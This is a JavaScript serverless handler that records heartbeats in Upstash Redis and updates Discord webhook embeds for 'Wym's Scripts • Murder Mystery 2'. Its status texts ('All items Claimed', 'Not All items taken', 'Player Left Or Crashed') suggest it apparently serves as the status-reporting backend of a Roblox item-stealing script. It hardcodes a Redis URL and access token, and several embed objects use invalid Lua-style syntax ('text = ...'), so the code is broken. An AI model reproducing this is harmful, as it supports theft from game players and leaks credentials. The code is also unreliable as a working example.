import { Redis } from '@upstash/redis'

const redis = new Redis({
  url: "https://sincere-pika-37791.upstash.io",
  token: "AZOfAAIncDFhMGViOTE2MTRiYjg0ZjRmOWRmNTg4ODViNTNiNDAwMXAxMzc3OTE",
})

export default async function handler(req, res) {
    // 1. Fix the 405 error: Allow both GET (for browser tests) and POST (for Cron/Roblox)
    if (req.method !== 'POST' && req.method !== 'GET') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // Standardize body parsing
    const body = req.body || {};
    const { msgId, webhookUrl, action } = body;

    // Log every hit so you finally see something in Vercel Logs
    console.log(`Incoming ${req.method} request - Action: ${action || 'check'}, ID: ${msgId || 'none'}`);

    // 1. WATCHDOG: This runs EVERY time (Cron or Roblox)
    try {
        const keys = await redis.keys('hb_*');
        for (const key of keys) {
            const data = await redis.get(key);
            
            // Check if player hasn't pinged in over 70 seconds
            if (data && (Date.now() - data.lastSeen > 70000)) {
                console.log(`Watchdog: Marking ${data.msgId} as Red (Timed out)`);
                await fetch(`${data.webhookUrl}/messages/${data.msgId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "Wym's Scripts • Murder Mystery 2",
                            description: "## Status:\n```lua\n🔴 Left (Player Left Or Crashed)```",
                            color: 16711680,
                            footer: { text = "Auto-detected departure via Cron" }
                        }]
                    })
                }).catch(() => {});
                
                await redis.del(key);
            }
        }
    } catch (err) {
        console.error("Watchdog error:", err);
    }

    // 2. LIVE UPDATES: Handle status changes from Roblox
    if (msgId && webhookUrl) {
        let embedUpdate = null;

        if (action === "partial") {
            embedUpdate = {
                title: "Wym's Scripts • Murder Mystery 2",
                description: "## Status:\n```lua\n🟡 Partial (Not All items taken)```",
                color: 16776960,
                footer: { text = "Partial Progress" }
            };
        } else if (action === "stop") {
            embedUpdate = {
                title: "Wym's Scripts • Murder Mystery 2",
                description: "## Status:\n```lua\n🟢 Success (All items Claimed)```",
                color: 65280,
                footer: { text = "Trade completed successfully!" }
            };
            await redis.del(`hb_${msgId}`);
        }

        if (embedUpdate) {
            await fetch(`${webhookUrl}/messages/${msgId}`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embedUpdate] })
            }).catch(() => {});
        }
    }

    // 3. HEARTBEAT: Update Redis to stay "Green"
    if (action === "ping" && msgId && webhookUrl) {
        await redis.set(`hb_${msgId}`, { msgId, webhookUrl, lastSeen: Date.now() }, { ex: 3600 });
    } 

    // Always return 200 so Cron-job.org stays active
    return res.status(200).json({ ok: true, watchdog_active: true });
}
